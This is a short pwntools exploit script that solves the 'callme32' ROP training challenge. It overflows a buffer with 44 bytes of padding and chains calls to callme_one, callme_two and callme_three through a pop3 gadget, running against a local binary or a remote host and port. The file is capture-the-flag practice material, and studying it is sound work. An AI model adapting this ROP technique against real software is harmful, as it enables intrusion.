from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./callme32")


class ROP_Gadget:
    one = 0xdeadbeef
    two = 0xcafebabe
    tres = 0xd00df00d
    callme_one = 0x080484f0
    callme_two = 0x08048550
    callme_tres = 0x080484e0
    exit = 0x08048510
    pop3_ret = 0x080487f9


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(44)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.callme_one,
        ROP_Gadget.pop3_ret,
        ROP_Gadget.one,
        ROP_Gadget.two,
        ROP_Gadget.tres,
        ROP_Gadget.callme_two,
        ROP_Gadget.pop3_ret,
        ROP_Gadget.one,
        ROP_Gadget.two,
        ROP_Gadget.tres,
        ROP_Gadget.callme_tres,
        ROP_Gadget.exit,
        ROP_Gadget.one,
        ROP_Gadget.two,
        ROP_Gadget.tres
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()

